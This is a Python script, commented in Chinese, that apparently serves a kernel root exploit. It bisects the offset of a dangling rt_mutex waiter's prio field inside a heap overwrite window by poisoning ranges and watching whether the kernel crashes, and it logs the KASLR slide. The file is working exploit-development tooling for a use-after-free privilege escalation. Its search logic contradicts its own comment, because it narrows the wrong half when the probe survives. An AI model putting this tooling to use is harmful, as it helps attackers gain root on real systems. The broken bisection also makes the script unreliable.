# -*- coding: utf-8 -*-
"""bisect2.py — 用**可靠**判据定位悬空 rt_waiter 的 prio 字在覆盖窗口里的下标。

判据(单比特, 两种结局都有意义):
  基础填充 = 120(=受害者真 prio ⇒ rt_mutex_waiter_equal 命中 ⇒ 链走 [3] 早退 ⇒ 存活)
  探针区   = 119(不等 ⇒ 继续走 ⇒ 此时 lock 字段读到的是 120/119 这类小整数 ⇒ 必炸)
  ⇒ **炸 ⇔ 真 prio 字 ∈ 探针区**

步骤:
  0) 全区毒(probe 0 64): 期望炸 ⇒ 证明"幽灵确实被链走读到"(否则它永远不会炸)。
     若这一步反而存活 ⇒ 没有幽灵(或覆盖不到), 立刻停下换触发方式。
  1) 二分 6 轮钉住 prio 字下标。
"""
import re, subprocess, sys, time, os
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

BASE = r'G:\项目\Windows管理\usb\临时root'
WORDS = 64


def run(lo, n):
    p = subprocess.run([sys.executable, os.path.join(BASE, 'cm57', 'auto.py'),
                        'probe %d %d' % (lo, n)], capture_output=True, text=True,
                       encoding='utf-8', errors='replace', timeout=1200)
    out = p.stdout + p.stderr
    survived = 'punch 已返回' in out
    m = re.search(r'选定 slide=([0-9a-f]+)', out)
    print('  毒区 [%3d,%3d) -> %s   slide=%s' % (lo, lo + n,
          '存活(prio 不在区内)' if survived else '炸(prio 在区内)',
          m.group(1) if m else '?'), flush=True)
    return survived


def main():
    print('步骤 0: 全区下毒 ⇒ 应炸(证明幽灵被读到)')
    if run(0, WORDS):
        print('!! 全区下毒仍存活 ⇒ 链走压根没读到我们的载荷: 幽灵不存在或覆盖不到。停。')
        return
    lo, hi = 0, WORDS
    while hi - lo > 1:
        mid = (lo + hi) // 2
        # 毒左半边: 炸 ⇒ prio 在 [lo,mid); 存活 ⇒ prio 在 [mid,hi) 且 lo=mid
        if run(lo, mid - lo):
            hi = mid
        else:
            lo = mid
        time.sleep(2)
    print('===> prio 字下标 = %d  (窗口字节 0x%x)' % (lo, lo * 8))
    print('     ⇒ 假 waiter 起点 = 窗口字节 0x%x (字 %d)' % (lo * 8 - 0x40, lo - 8))
    print('     ⇒ 与静态模型 i=j+0x88 的差 = %d 字节' % (lo * 8 - 0x40 - 0x88))


main()
